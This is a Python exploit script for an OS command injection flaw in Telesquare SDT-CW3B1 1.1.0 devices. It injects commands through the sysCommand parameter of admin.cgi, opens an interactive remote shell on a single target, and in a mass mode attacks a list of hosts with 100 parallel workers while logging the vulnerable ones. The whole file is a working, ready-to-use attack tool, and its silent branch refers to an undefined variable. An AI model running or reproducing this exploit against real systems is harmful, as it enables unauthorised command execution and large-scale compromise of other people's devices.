#!/usr/bin/python3 

import os, sys, requests, argparse, concurrent.futures
from rich.console import Console
from xml.etree import ElementTree

console = Console()

banner = ('''
   _______    ________    ___   ____ ___  ___      __ __  _____ __ __ ___  ___      
  / ____/ |  / / ____/   |__ \ / __ \__ \<  /     / // / / ___// // /|__ \|__ \     
 / /    | | / / __/________/ // / / /_/ // /_____/ // /_/ __ \/ // /___/ /__/ /     
/ /___  | |/ / /__/_____/ __// /_/ / __// /_____/__  __/ /_/ /__  __/ __// __/      
\____/  |___/_____/    /____/\____/____/_/        /_/  \____/  /_/ /____/____/      
                                                                                    

Telesquare SDT-CW3B1 1.1.0 - OS Command Injection [ Valentin Lobstein ]
''')

console.print(f'[bold yellow]{banner}')
parser = argparse.ArgumentParser()
parser.add_argument("-u","--url", help="Target URL/IP")
parser.add_argument("-f","--file",help="Target file")
parser.add_argument("-c","--command", default='id', help="Command")
args = parser.parse_args()


def exploit(url,silent=True):
	if not '://' in url:
		url = "http://" + url.strip('\n')

	url +=  "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=" 
	display_url = url.replace('/cgi-bin/admin.cgi?Command=sysCommand&Cmd=','')
	#checking does the CGI exists?
	response = requests.get(url,timeout=5,verify=False)

	if(response.status_code == 200):
		if silent == False:
			console.print("[bold yellow][*] CGI script exist!")
			console.print("[bold  yellow][*] Injecting some shell command.")

		#1st test injecting id command
		cmd = args.command

		try:
			response = requests.get(url + cmd, stream=True)
			xmlparser = ElementTree.iterparse(response.raw)

			cmdRet = []

			for event, elem in xmlparser:
				if(elem.tag == 'CmdResult'):
					cmdRet.append(elem.text)
		except:
			console.print(f"[bold red][!] Host {display_url} not vulnerable")
			sys.exit(0)

		if(len(cmdRet) != 0):
			text = f'[*] Vulnerable {display_url}: {cmdRet[0].strip()}'
			console.print(f'[bold green][*] Vulnerable {display_url}: [bold cyan]{cmdRet[0].strip()}')
			with open(f'{os.getcwd()}/vuln.txt','a') as f:
				f.write(f'{text}\n')
			
			if silent == False:
				#start shell iteration
				print()
				try:
					while True:
						
						cmdInput = console.input("[bold cyan]┌──([bold red]chocapik[bold yellow]㉿[bold red]shell[/bold red][bold cyan])-[⭐]\n└─🔥# ")

						if(cmdInput == "exit"):
							console.print("[*] Exiting shell.")
							sys.exit(0)
						elif cmdInput == 'clear':
							if os.name == 'nt':
								os.system('cls')
							else:
								os.system('clear')

						response = requests.get(url + cmdInput, stream=True)
						xmlparser = ElementTree.iterparse(response.raw)


						for event, elem in xmlparser:
							if(elem.tag == 'CmdResult'):
								console.print(f'[bold cyan]{elem.text.strip()}\n')

				except KeyboardInterrupt:
					console.print('[bold yellow][+] Bye Bye !!')
					sys.exit(1)

			else:
				response = requests.get(url + cmdInput, stream=True)
				xmlparser = ElementTree.iterparse(response.raw)
				for event, elem in xmlparser:
					if(elem.tag == 'CmdResult'):
						console.print(response.headers)
						console.print(f'[bold byan]{elem.text.strip()}\n')

					console.print('\n')
				
		elif not silent == False:
			console.print("[bold red][!] Something doesn't looks right. Please check the request packet using burpsuite/wireshark/etc.")
			sys.exit(0)

	elif silent == False:
		console.print("[bold red][!] CGI script not found.")
		console.print(response.status_code)
		sys.exit(0)
	



def massexploit(file):
	with open(file,'r') as f:
		links = f.readlines()
		executor = concurrent.futures.ProcessPoolExecutor(100)
		futures = [executor.submit(exploit, link) for link in links]
		concurrent.futures.wait(futures)

	with open(f'{os.getcwd()}/vuln.txt','r') as f:
			length = len(f.readlines())

	console.print(f'Saved {length} vulnerable targets into {os.getcwd()}/vuln.txt')


def main():
	file = args.file
	url = args.url	
	if url and not file:
		exploit(url,silent=False)
	elif file and not url:
		massexploit(file)

if  __name__ == "__main__":
	main()
            
